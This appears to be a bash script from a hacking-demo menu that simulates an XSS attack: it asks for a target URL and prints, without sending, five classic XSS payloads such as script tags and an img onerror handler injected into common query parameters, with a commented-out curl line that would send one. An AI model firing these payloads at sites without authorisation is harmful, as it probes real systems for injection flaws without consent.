#!/bin/bash

# Colors
RED="\e[31m"
GREEN="\e[32m"
CYAN="\e[36m"
YELLOW="\e[33m"
RESET="\e[0m"

clear
echo -e "${CYAN}====================================="
echo -e "        XSS Attack Demo (Simulated)"
echo -e "=====================================${RESET}"

# Ask for the target URL
read -p "Enter target URL (with http/https): " url

# Input validation
if [[ -z "$url" ]]; then
  echo -e "${RED}[!] URL cannot be empty.${RESET}"
  read -p "Press Enter to return to menu..."
  exit 1
fi

if [[ ! "$url" =~ ^https?:// ]]; then
  echo -e "${YELLOW}[!] Please enter a valid URL with http or https.${RESET}"
  read -p "Press Enter to return to menu..."
  exit 1
fi

echo -e "${GREEN}[*] Starting simulated XSS attack on:${RESET} $url"

# Simulated payloads
payloads=(
  "<script>alert('XSS')</script>"
  "\"><script>alert(1)</script>"
  "<img src=x onerror=alert('XSS')>"
  "<svg onload=alert(1)>"
  "<body onload=alert('XSS')>"
)

# Simulated parameters to inject into
params=("search" "q" "input" "term")

echo -e "${CYAN}[*] Simulating injection into common parameters...${RESET}"
sleep 1

# Simulate parameter fuzzing with payloads
for param in "${params[@]}"; do
  for payload in "${payloads[@]}"; do
    echo -e "${YELLOW}[SIMULATED]${RESET} $url?$param=$payload"
    sleep 0.2
  done
done

echo -e "\n${GREEN}[*] Analysis:${RESET} Simulated payloads tested across multiple parameters."
echo -e "${CYAN}[!] This is only a demonstration. No real request was made.${RESET}"

# Optional real request (commented for safety)
# echo -e "\n${YELLOW}[!] Want to test with curl? Uncomment in code with caution.${RESET}"
# curl "$url?search=<script>alert('XSS')</script>"

echo -e "\n${GREEN}✔ Simulation complete.${RESET}"
read -p "Press Enter to return to menu..."
